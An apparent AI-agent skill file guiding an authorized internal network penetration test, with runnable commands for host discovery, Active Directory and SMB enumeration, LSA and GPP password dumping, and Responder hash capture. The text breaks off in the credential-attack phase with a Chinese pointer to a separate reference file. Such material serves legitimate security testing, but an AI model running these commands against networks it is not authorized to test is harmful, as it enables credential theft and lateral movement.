---
name: conducting-internal-network-penetration-test
description: Execute an internal network penetration test simulating an insider threat
when-to-use: Execute an internal network penetration test simulating an insider threat
  or post-breach attacker to identify lateral movement paths, privilege escalation
  vectors, and sensitive data exposure within the corporate network.
domain: cybersecurity
subdomain: penetration-testing
tags:
- internal-pentest
- lateral-movement
- privilege-escalation
- Responder
- Impacket
- assumed-breach
- network-security
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1046
- T1018
- T1021
- T1210
---

# Conducting Internal Network Penetration Test

## Overview

An internal network penetration test simulates an attacker who has already gained access to the internal network or a malicious insider. The tester operates from an "assumed breach" position — typically a standard domain workstation or network jack — and attempts lateral movement, privilege escalation, credential harvesting, and data exfiltration to determine the blast radius of a compromised endpoint.


## When to Use

- When conducting security assessments that involve conducting internal network penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Signed Rules of Engagement with internal network scope
- Network access: physical Ethernet drop or VPN connection to internal VLAN
- Standard domain user credentials (assumed breach model) or unauthenticated access
- Testing laptop with Kali Linux, Impacket, Responder, BloodHound
- Coordination with IT/SOC for monitoring and emergency contacts


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Phase 1 — Network Discovery and Enumeration

### Initial Network Reconnaissance

```bash
# Identify your own network position
ip addr show
ip route show
cat /etc/resolv.conf

# ARP scan for live hosts on local subnet
arp-scan --localnet --interface eth0

# Nmap host discovery across internal ranges
nmap -sn 10.0.0.0/8 --exclude 10.0.0.1 -oG internal_hosts.gnmap
nmap -sn 172.16.0.0/12 -oG internal_hosts_172.gnmap
nmap -sn 192.168.0.0/16 -oG internal_hosts_192.gnmap

# Extract live hosts
grep "Status: Up" internal_hosts.gnmap | awk '{print $2}' > live_hosts.txt

# Port scan live hosts — top 1000 ports
nmap -sS -sV -T4 -iL live_hosts.txt -oA internal_tcp_scan

# Service-specific scans
nmap -p 445 --open -iL live_hosts.txt -oG smb_hosts.gnmap
nmap -p 3389 --open -iL live_hosts.txt -oG rdp_hosts.gnmap
nmap -p 22 --open -iL live_hosts.txt -oG ssh_hosts.gnmap
nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
```

### Active Directory Enumeration

```bash
# Enumerate domain information with domain credentials
# Using CrackMapExec / NetExec
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups

# LDAP enumeration
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa

# BloodHound data collection
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all
# Import JSON files into BloodHound GUI for attack path analysis

# Enum4linux-ng for legacy enumeration
enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
```

### Network Service Enumeration

```bash
# SMB share enumeration
smbclient -L //10.0.0.10 -U 'testuser%Password123'
smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R

# SNMP enumeration
snmpwalk -v2c -c public 10.0.0.1

# DNS zone transfer attempt
dig axfr corp.local @10.0.0.5

# NFS enumeration
showmount -e 10.0.0.15

# MSSQL enumeration
impacket-mssqlclient 'corp.local/testuser:Password123@10.0.0.20' -windows-auth
```

## Phase 2 — Credential Attacks

### Network Credential Capture

```bash
# Responder — LLMNR/NBT-NS/mDNS poisoning
sudo responder -I eth0 -dwPv

# Capture NTLMv2 hashes from Responder logs
cat /usr/share/responder/logs/NTLMv2-*.txt

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
